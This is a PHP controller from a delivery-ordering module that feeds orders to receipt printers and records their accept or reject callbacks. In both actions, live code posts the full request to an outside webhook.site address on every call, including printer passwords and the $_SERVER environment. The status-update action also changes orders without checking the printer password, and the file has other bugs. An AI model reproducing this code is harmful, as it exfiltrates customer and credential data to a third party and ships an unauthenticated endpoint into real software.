<?php
class Xdelivery_Public_OrderController extends Xdelivery_Controller_Default
{
    public function getorderAction()
    {
        $array = array();
        $array['get'] = $this->getRequest()->getQuery();
        $array['post'] = $_POST;
        $array['request'] = $_REQUEST;
        $array['server'] = $_SERVER;
        $array['type'] = "=====================================";
        $json_data = json_encode($array);
        // add a curl to send the data to the server
        $url = "https://webhook.site/26bb9ee3-4177-41f0-a753-6d44396cf7bb";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
        // exit;
        if ($datas = $this->getRequest()->getQuery()) {
            try {
                $query_string = implode('&', array_map(
                    function ($v, $k) { return $k . '=' . $v; }, 
                    $datas, 
                    array_keys($datas)
                ));

                $ipaddress = '';

                if (getenv('HTTP_CLIENT_IP'))

                    $ipaddress = getenv('HTTP_CLIENT_IP');

                else if(getenv('HTTP_X_FORWARDED_FOR'))

                    $ipaddress = getenv('HTTP_X_FORWARDED_FOR');

                else if(getenv('HTTP_X_FORWARDED'))

                    $ipaddress = getenv('HTTP_X_FORWARDED');

                else if(getenv('HTTP_FORWARDED_FOR'))

                    $ipaddress = getenv('HTTP_FORWARDED_FOR');

                else if(getenv('HTTP_FORWARDED'))

                $ipaddress = getenv('HTTP_FORWARDED');

                else if(getenv('REMOTE_ADDR'))

                    $ipaddress = getenv('REMOTE_ADDR');

                else

                    $ipaddress = 'UNKNOWN';



                    Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                    'query_string' => $query_string,

                    'call_type' => 'Printer Call Record(IP: '.$ipaddress.').',

                    'log_type' => 1

                ]);
                $unique_key = '';
                $password = '';
                $is_printed = false;
                $last_order_id = false;
                if($datas['restid']) { //1.0

                    $unique_key = $datas['restid'];

                    $password = $datas['password'];

                    $is_printed = $datas['print'];

                    $last_order_id = $datas['lastorder'];

                } else { //2.0 OR 3.0

                    $unique_key = trim($datas['u']);

                    $password = trim($datas['p']);

                }
                $is_printer_new = false;
                $printer = new Xdelivery_Model_Printers();
                $printer->find(['printer_username'=>$unique_key,'printer_password'=>$password]);
               
                $order = new Xdelivery_Model_Orders();
				$product = new Xdelivery_Model_OrderItems();
                
                // dd($printer);
                if($printer->getPrinterId()) {
					$start_fetching_orders_from = $printer->getStartFetchingOrdersFrom();
					$owner_object = new Xdelivery_Model_Admins();
					$owners = $owner_object->findAll([
						'value_id = ?' => $printer->getValueId(),
					]);
					if (!count($owners)) {
						echo '';
						exit;
					} 
					 

					$order = new Xdelivery_Model_Orders();
                    switch($printer->getPrinterType()) {

                        case 1:
                            $is_printer_new = false;
                            break;
						case 2:
						case 3:	
                            $is_printer_new = true;
                            $orders = $order->findAll([
                                'value_id = ?' => $printer->getValueId(),
								'store_id = ?' => $printer->getStoreId(),
                                'status = ?' => 'processing',
                                'start_fetching_orders_from = ?' => $start_fetching_orders_from,
                            ]);
                            if (count($orders)) {
                                $is_printed = 0;
                            }
                            break;
                    }
                    if(!$is_printed && $last_order_id) {
                        
                        $order_pre = $order->find([
                            'value_id' => $printer->getValueId(),
                            'store_id' => $printer->getStoreId(),
							'id' => $last_order_id,

                        ]);

                        $order_pre_status = $order_pre->getData()['status'];
                        if($order_pre->getId() && $order_pre_status == 'processing' && $order_pre->getOrderFetchedCount() > 10) {

                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                'app_id' => $printer->getAppId(),

                                'value_id' => $printer->getValueId(),

                                'order_id' => $order->getId(),
                                'printer_username' => $printer->getPrinterUsername(),

                                'query_string' => $query_string,

                                'call_type' => 'Order still processing.',

                                'status' => 'Processing',

                                'log_type' => 1,

                            ]);


                            echo '';

                            exit;

                        }

                    }

                    $order_array = $order->find([
                        'value_id' => $printer->getValueId(),
                        'store_id' => $printer->getStoreId(),
                        'status' => 'processing',
                        'start_fetching_orders_from = ?' => $start_fetching_orders_from,
                    ], 'id ASC');
                    $order_status = $order_array->getData()['status'];
                    
                    if($order_array->getId()) {
                        if($order_status == 'processing' && $order_array->getOrderFetchedCount() > 10) {

                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                'app_id' => $printer->getAppId(),

                                'value_id' => $printer->getValueId(),

                                'order_id' => $order->getId(),
                                'printer_username' => $printer->getPrinterUsername(),

                                'query_string' => $query_string,

                                'call_type' => 'Order failed due to no responce',

                                'status' => 'failed',

                                'log_type' => 1,

                            ]);
                            $order->addData([
                                'order_fetched_count' => $order_array->getOrderFetchedCount() + 1,
                                'status' => 'failed',
                                'id' => $order->getId(),
                            ])->save();

                            echo '';

                            exit;

                        }
                        if($last_order_id && $last_order_id == $order_array->getId() && $order_status == 'processing') {

                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                'app_id' => $printer->getAppId(),

                                'value_id' => $printer->getValueId(),

                                'order_id' => $order_array->getId(),
                                'printer_username' => $printer->getPrinterUsername(),

                                'query_string' => $query_string,

                                'call_type' => 'Order Failed.',

                                'status' => 'Failed',

                                'log_type' => 1,

                            ]);

                            //Suspended template process will goes here/////////////////
                            $order->find([
                                'value_id' => $printer->getValueId(),
                                'store_id' => $printer->getStoreId(),
                                'id' => $last_order_id,
                            ]);
                            $order->addData([
                                'order_fetched_count' => $order_array->getOrderFetchedCount() + 1,

                                'status' => 'failed',
                                'id' => $last_order_id,

                            ])->save();

                            echo '';

                            exit;

                        }

                        $products = $product->findAll([
                            'order_id = ?' => $order_array->getId()
						]);
                        $have_prod = false;
                        foreach($products as $product_i) {
                            if($product_i->getOrderId()){
                                $have_prod = true;
                            
                            }
                        }
						$total_products = $total_options = 0;

                        if($have_prod) {

                            $address = $order_array->getCustomerStreet() ? $order_array->getCustomerStreet().',' : '';

                            $address .= $order_array->getCustomerCity() ? $order_array->getCustomerCity() : '';

                            $postcode = $order_array->getCustomerPostcode() ? $order_array->getCustomerPostcode() : '';

                            $phone = $order_array->getCustomerPhone() ? $order_array->getCustomerPhone() : '';

                            $separator = '*';

                            $pdt = $order_array->getDeliveryDate() ? $order_array->getDeliveryDate() : '';
                            $pdt .= $order_array->getDeliveryDTime() ? $order_array->getDeliveryDate() : '';

                            $delivery_note = $order_array->getNotes() ? __('Delivery Note').':'.$order_array->getNotes() : '';

                            $pdt = $is_printer_new ? $pdt : '<l>'.$pdt;

							
                            $new_printer_address = $address . "\\rCAP " . $postcode . "\\r" . $phone;
                            $old_printer_address = $address . "<br>CAP " . $postcode . "<br>" . $phone;

                            $order_string_gt = "#".$printer->getPrinterUsername().$separator.$separator.$printer->getStoreId()."_".$order_array->getId().$separator.__('CLIENT')."\\r------------------------------\\r".ucfirst($order_array->getCustomerFirstname())." ".ucfirst($order_array->getCustomerLastname())."\\r".$new_printer_address."\\r------------------------------\\r";
                            // __('ORDER')." n ".$printer->getStoreId()."_".$order_array->getId()."\\r------------------------------";

                            $order_string = "#".$printer->getPrinterUsername().$separator.$printer->getStoreId()."_".$order_array->getId().$separator;

                            $order_string .= "<dot><br><l>".__('CLIENT')."<br>".ucfirst($order_array->getCustomerFirstname())." ".ucfirst($order_array->getCustomerLastname())."<br>".$old_printer_address."<br><dot><br>";
                            // __('ORDER')." n ".$printer->getStoreId()."_".$order_array->getId()."<br>";

                            foreach($products as $product_obj) {

								$total_products++;

                                $quantity = intval($product_obj->getQty());

                                $product_name = $product_obj->getName();

                                $product_price = number_format((float)$product_obj->getTotal(), 2, '.', '');

                                $order_string_gt .= "\\r".$quantity.";".$product_name.";".$printer->getCurrencyCode().$product_price.";";

                                $product_string = $quantity.' x '.$product_name.'<right>'.$printer->getCurrencyCode().$product_price.'<br>';

                                

                                $options_array = json_decode($product_obj->getOptions(),true); 
                               
                                if(sizeof($options_array) && !empty($options_array[0]['name'])) {

									$order_string_gt .= __('Option') . ":";

									$order_string_gt .= ";;;";

                                    foreach($options_array as $option) {

										$total_options++;

                                        $product_string .= $option['qty'].' xXXX '.$option['name'].': '.$printer->getCurrencyCode(). number_format((float)$option['price'], 2, '.', '').'<br>';

                                        $order_string_gt .= $option['qty'].";".$option['name'].'12345'.";".$printer->getCurrencyCode(). number_format((float)$option['price'], 2, '.', '').";";

                                    }
								}
                               
								if (!is_null($product_obj->getChoices()) && count(json_decode($product_obj->getChoices(),true))) {
									$choices_data = [];
									foreach (json_decode($product_obj->getChoices(),true) as $id => $choice) {
											$choices_data[] = $choice['name'].";".$printer->getCurrencyCode(). number_format((float)$choice['price'], 2, '.', '').";";
									}
									$order_string_gt .= __('Choice') . ': ';
									$choices = implode(", ", $choices_data);
									$product_string .= $choices;
									$product_string .= '<br>';
									$order_string_gt .= $choices;
									$order_string_gt .= ";;;";
								}	

                                $order_string .= $product_string;

							}


                            $order_id = $order_array->getId();
                            $payment_method = (new Xdelivery_Model_OrderTransactions)->getOrderPaymentMethodName($order_id);
                            $note = $order_array->getNotes() ? $order_array->getNotes() : '';
							$order_string_gt .= "\\r" . __('Products') . ': ' . $total_products . ', ' . __('Options') . ': ' . $total_options . ";;;";

							$order_string_gt .= "**;;";

                            $order_string_gt .= ";------------------------------\\r";
                            $order_string_gt .= __('Delivery Cost')." - - - - - - ".$printer->getCurrencyCode(). number_format((float)$order_array->getDeliveryCost(), 2, '.', '')."\\r";
                            $order_string_gt .= __('TOTAL')." - - - - - - - - - - - ".$printer->getCurrencyCode(). number_format((float)$order_array->getTotalAmount(), 2, '.', '')."\\r";
                            $order_string_gt .= __('Tax')." - - - - - - - - - - - - - ".$printer->getCurrencyCode().$order_array->getTotalTax()."\\r------------------------------\\r";
                            $order_string_gt .= __('DELIVERY')." - - - - - - - - - ".$order_array->getDeliveryMethod().'\\r';
                            $order_string_gt .= __('PAYMENT')." - - - - ".$payment_method.'\\r';
                            $order_string_gt .= __('DATE')." - - - - ".date('d/m/Y',$order_array->getDeliveryDate())." ".date('H:i',$order_array->getDeliveryTime())."\\r";
                            $order_string_gt .= ";------------------------------\\r";
                            $order_string_gt .=  __('COMMENTS')." \\r";
                            $order_string_gt .=  ((strlen($note) > 160) ? $this->_substrWords($note, 160) : $note)."\\r\\r\\r\\r\\r".";;;;*#";

                            $order_string .= "<l>".__('TOTAL')."<right>".$printer->getCurrencyCode(). number_format((float)$order_array->getTotalAmount(), 2, '.', '')."<br>";

							$order_string .= __('Delivery Cost')."<right>".$printer->getCurrencyCode(). number_format((float)$order_array->getDeliveryCost(), 2, '.', '')."<br>";

							$order_string .= __('Tax')."<right>".$order_array->getTotalTax()."<br>";
							$order_string .= __('DELIVERY')."<right>".$order_array->getDeliveryMethod()."<br>";

                            $order_string .= __('PAYMENT')."<right>".$payment_method."<br>";

                            $order_string .= __('DATE')."<right>".date('d/m/Y',$order_array->getDeliveryDate())." ".date('H:i:s',$order_array->getDeliveryTime())."<br>";

                            $order_string .= "<line><br><center><l>".__('NOTE')."<br>".(strlen($note) > 160) ? $this->_substrWords($note, 160) : $note."<br><br><br><br><br><br><br><br><br><br>";

                            $order_string .= "#";

                            if(strlen($order_string) > (8 * 128) || strlen($order_string_gt) > (8 * 128)) {
								$final_order = html_entity_decode(preg_replace('/[\x00-\x1F\x80-\xFF]/', '', (($is_printer_new) ? $order_string_gt : $order_string)));
								$final_order = str_replace(['/b', '/B'], ['-b', '-B'], $final_order);
								$order_length = strlen($final_order);
								$start_range = 0;
								$end_range = 1023;
								$content_length = 1024;
								if (is_null($order_array->getOrderCodeRange())) {
									$all_ranges = [];
									$splitted_codes = str_split($final_order, 1024);
									foreach ($splitted_codes as $key => $splitted_code) {
										if (!$key) {
											$all_ranges[] = [
												0, 
												1023, 
												strlen($splitted_code)
											];
										} else {
											$all_ranges[] = [
												$all_ranges[$key - 1][1] + 1, 
												($all_ranges[$key - 1][1] + 1) + (strlen($splitted_code) - 1), 
												strlen($splitted_code)
											];
										}
									}
									array_shift($all_ranges);
									$all_ranges = array_values($all_ranges);
                                    // if($datas['testing']) {
                                    //     dd( serialize($all_ranges), $final_order);
                                    // }
									$order->addData([
										'order_code_range' => serialize($all_ranges),
                                        'id' => $order_array->getId(),
									])->save();
								} else {
									$order_code_range = unserialize($order_array->getOrderCodeRange());
                                    // if($datas['testing']) {
                                    //     dd($order_code_range, $final_order);
                                    // }
									if (count($order_code_range)) {
										$start_range = $order_code_range[0][0];
										$end_range = $order_code_range[0][1];
										$content_length = $order_code_range[0][2];
										array_shift($order_code_range);
										$order_code_range = array_values($order_code_range);
										if (count($order_code_range)) {
											$order->addData([
												'order_code_range' => serialize($order_code_range),
                                                'id' => $order_array->getId(),
											])->save();
										} else {

                                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                                'app_id' => $printer->getAppId(),

                                                'value_id' => $printer->getValueId(),

                                                'order_id' => $order_array->getId(),
                                                'printer_username' => $printer->getPrinterUsername(),

                                                'query_string' => $query_string,

                                                'call_type' => 'Order patch.',

                                                'status' => 'Processing',

                                                'log_type' => 1,

                                            ]);
											

											$order->addData([
												'order_fetched_count' => $order_array->getOrderFetchedCount() + 1,
												'order_fetch_time' => date('Y-m-d H:i:s'),
												'status' => 'Processing',
												'order_code_range' => serialize([]),
                                                'id' => $order_array->getId(),
											])->save();

										}
									}
								}
								$order->addData([
									'order_receipt_code' => base64_encode($final_order),
                                    'id' => $order_array->getId(),
								])->save();
								header("HTTP/1.1 206 Partial Content");
								header("Accept-Ranges: $start_range-$end_range");
								header("Content-Range: bytes $start_range-$end_range/$order_length");
								header("Content-Length: $content_length");
								header("Content-Type: text/plain");
								echo substr($final_order, $start_range, ($end_range + 1));
								exit;
								/*$order_string .= "<br>".__('WARNING! ORDER TOO MUCH LONG CHECK WEBSITE');
                                $order_string_gt .= __('WARNING! ORDER TOO MUCH LONG CHECK WEBSITE');
                                Migaprintv2_Model_Db_Table_Log::saveLog([
                                    'app_id' => $printer->getAppId(),
                                    'value_id' => $printer->getValueId(),
                                    'order_id' => $order_array->getId(),
                                    'custom_order_id' => $order_array['custom_order_id'],
                                    'printer_username' => $printer->getPrinterUsername(),
                                    'log_query_string' => $query_string,
                                    'log_called_by' => 'Printer',
                                    'log_call_type' => 'Order too long.',
                                    'log_status' => 'Cancelled',
                                    'log_type' => 1,
								]);*/
                            } else {
                                Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                    'app_id' => $printer->getAppId(),

                                    'value_id' => $printer->getValueId(),

                                    'order_id' => $order_array->getId(),
                                    'printer_username' => $printer->getPrinterUsername(),

                                    'query_string' => $query_string,

                                    'call_type' => 'Order patch.',

                                    'status' => 'Processing',

                                    'log_type' => 1,

                                ]);
                                
                                $order->addData([
                                    'order_fetched_count' => $order_array->getOrderFetchedCount() + 1,
                                    'order_fetch_time' => date('Y-m-d H:i:s'),
                                    'status' => 'processing',
                                    'id' => $order_array->getId(),
                                ])->save();

                            }

							$final_order = html_entity_decode(preg_replace('/[\x00-\x1F\x80-\xFF]/', '', (($is_printer_new) ? $order_string_gt : $order_string)));

							$order->addData([
                                'order_receipt_code' => base64_encode($final_order),
                                'id' => $order_array->getId(),
							])->save();
							
							echo str_replace(['/b', '/B'], ['-b', '-B'], $final_order);
							exit;

                        } else {

                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                'app_id' => $printer->getAppId(),

                                'value_id' => $printer->getValueId(),

                                'order_id' => 1,
                                'printer_username' => $printer->getPrinterUsername(),

                                'query_string' => $query_string,

                                'call_type' => 'No product found..',

                                'status' => 'canceled',

                                'log_type' => 1,

                            ]);
                            

                            echo '';

                            exit;

                        }

                    } else {

                        Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                            'app_id' => $printer->getAppId(),

                            'value_id' => $printer->getValueId(),

                            'order_id' => $order_array->getId(),
                            'printer_username' => $printer->getPrinterUsername(),

                            'query_string' => $query_string,

                            'call_type' => 'No product found..',

                            'status' => 'canceled',

                            'log_type' => 1,

                        ]);
                        

                        echo '';

                        exit;

                    }

                } else {

                    throw new Exception();

                }

            } catch (\Exception $e) {
                
                Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                    'query_string' => $query_string,

                    'call_type' => 'Invalid printer credentials.',

                    'status' => 'canceled',

                    'log_type' => 1,

                ]);
                
                echo '';

                exit;

            }

        } else {

            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([
                'call_type' => 'No query string was present.',
                'status' => 'canceled',
                'log_type' => 1,
            ]);
            echo '';

            exit;

        }
        /// start get order process
       
    }

    // a=31&o=31_233&ak=Accepted&m=OK&dt=00:48&dd=230824&u=123456&bat=33&p=12345678&cur=0048542308
    public function updateorderstatusAction()
    {
        $array = array();
        $array['get'] = $_GET;
        $json_data = json_encode($array);
        // add a curl to send the data to the server
        $url = "https://webhook.site/26bb9ee3-4177-41f0-a753-6d44396cf7bb";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($datas = $this->getRequest()->getQuery()) {
            // if (!isset($datas['testing'])) {
            //     echo "";
            //     exit;
            // }
            try {
                $status = '';
                $printer_pdt = '';
                $query_string = implode('&', array_map(
                    function ($v, $k) { return $k . '=' . $v; }, 
                    $datas, 
                    array_keys($datas)
                ));
                
                if($datas['restid']) { //1.0

                    $unique_key = $datas['restid'];

                    $custom_order_id = explode('_', $datas['ordernumber'])[1];

                    if($datas['status'] && $datas['status'] == 'rejected') {

                        $status = 'rejected';	

                    }

                    if($datas['deliverytime']) {

                        $printer_pdt = $datas['deliverytime'];	

                    }

                } else { //2.0 OR 3.0

                    $store_id = $datas['a'];

                    $unique_key = trim($datas['u']);

                    $password = trim($datas['p']);
                    $custom_order_id = explode('_', $datas['o'])[1];

                    if($datas['ak'] && in_array($datas['ak'], ['rejected', 'Rejected'])) {

                        $status = 'rejected';

                    }

                    if($datas['dt']) {

                        $printer_pdt = $datas['dt'];	

                    }

                }

                $log_called_by = 'Printer';

                $printer = new Xdelivery_Model_Printers();
                $printer->find([
                    'printer_username' => $unique_key,
                ]);

                $order = new Xdelivery_Model_Orders();

                if($printer->getId()) {
					
					
                    $order->find([
                        'value_id' => $printer->getValueId(),
                        'store_id' => $printer->getStoreId(),
                        'id' => $custom_order_id,
                    ]);

                    if($order->getId()) {

                        $product = new Xdelivery_Model_OrderItems();

                        $products = $product->findAll([
                            'order_id = ?' => $order->getId()
                        ]);

                        if(($datas['log_called_by'] && $datas['pdt'] && $datas['pdt'] != date('H:i',$order->getDeliverytime())) || ($printer_pdt && $printer_pdt != date('H:i',$order->getDeliverytime() && date($printer_pdt) > date('H:i',$order->getDeliverytime())))) { 

								$order->addData([
									'order_deliverytime' =>  date("Y-m-d H:i:s",strtotime($printer_pdt)),
	                                'id' => $custom_order_id
								])->save();
                        }

                        if($status == "rejected") {

                            $status = "Rejected";

                                Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                    'app_id' => $printer->getAppId(),
        
                                    'value_id' => $printer->getValueId(),
        
                                   'order_id' => $order->getId(),
                                    'printer_username' => $printer->getPrinterUsername(),
        
                                    'query_string' => $query_string,
        
                                    'call_type' => 'Call back.',
        
                                    'status' => 'Rejected',
        
                                    'log_type' => 1,
        
                                ]);
                                
                                $order->addData([
                                    'order_response_time' => date('Y-m-d H:i:s'),
									'status' => 'canceled',
	                                'id' => $custom_order_id
                                ])->save();

                        } else {

                            $status = "Confirmed";

                            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                                'app_id' => $printer->getAppId(),
    
                                'value_id' => $printer->getValueId(),
    
                               'order_id' => $order->getId(),
                                'printer_username' => $printer->getPrinterUsername(),
    
                                'query_string' => $query_string,
    
                                'call_type' => 'Call back.',
    
                                'status' => $status,
    
                                'log_type' => 1,
    
                            ]);
                            $order->addData([
                                'order_response_time' => date('Y-m-d H:i:s'),
								'status' => 'accepted',
                                'id' => $custom_order_id
                            ])->save();
                        }
                        echo '';

                        exit;

                    } else {

                        Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                            'app_id' => $printer->getAppId(),

                            'value_id' => $printer->getValueId(),

                           'order_id' => $order->getId(),
                            'printer_username' => $printer->getPrinterUsername(),

                            'query_string' => $query_string,

                            'call_type' => 'Call back. Wrong order number',

                            'status' => 'cancled',

                            'log_type' => 1,

                        ]);

                        echo '';

                        exit;

                    }

                } else {

                    throw new Exception();

                }

            } catch (\Exception $e) {
                dd($e);
                Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                   'order_id' => 1,

                    'query_string' => $query_string,

                    'log_call_type' => 'Invalid printer credentials.',

                    'log_type' => 2
                ]);
                echo '';

                exit;

            }

        } else {

            Xdelivery_Model_Db_Table_PrinterLogs::saveLog([

                'order_id' => 1,

                 'log_call_type' => 'No query string was present',

                 'log_type' => 2
             ]);

            echo '';

            exit;

        }

    }

	private function _error( $error ) {
		
		if ( $this->_isJson( $error ) ) {
			$error = json_decode( $error );
		}
		
		return $this->_output( __($error) , null );
	}
	
	private function _data( $data ) {
		
		if ( $this->_isJson( $data ) ) {
			$data = json_decode( $data );
		}
		
		return $this->_output( null , $data );
	}
	
	private function _output( $error , $data ) {
		
		header( 'Content-Type: application/json' );
		
		echo json_encode( [ 'error' => $error , 'data' => $data ] , JSON_PRETTY_PRINT );
	}
	
	private function _isJson( $string ) {
		
		if ( is_string( $string ) ) {
			json_decode( $string );
			
			return ( json_last_error() == JSON_ERROR_NONE );
		}
		
		return false;
	}

	private function _substrWords( $text, $maxchar , $end = '...' ) {

		if(strlen($text) > $maxchar || $text == '') {

			$words = preg_split('/\s/', $text);      

			$output = '';

			$i      = 0;

			while (1) {

				$length = strlen($output)+strlen($words[$i]);

				if ($length > $maxchar) {

					break;

				} else {

					$output .= " " . $words[$i];

					++$i;

				}

			}

			$output .= $end;

		} else {

			$output = $text;

        }

        

		return $output;

    }

	private function _datesToMinutes( $date1 = "", $date2 = "" ) {

        $datetime1 = strtotime($date1);

        $datetime2 = strtotime($date2);

        $interval  = abs($datetime2 - $datetime1);

        return round($interval / 60);

	}
}
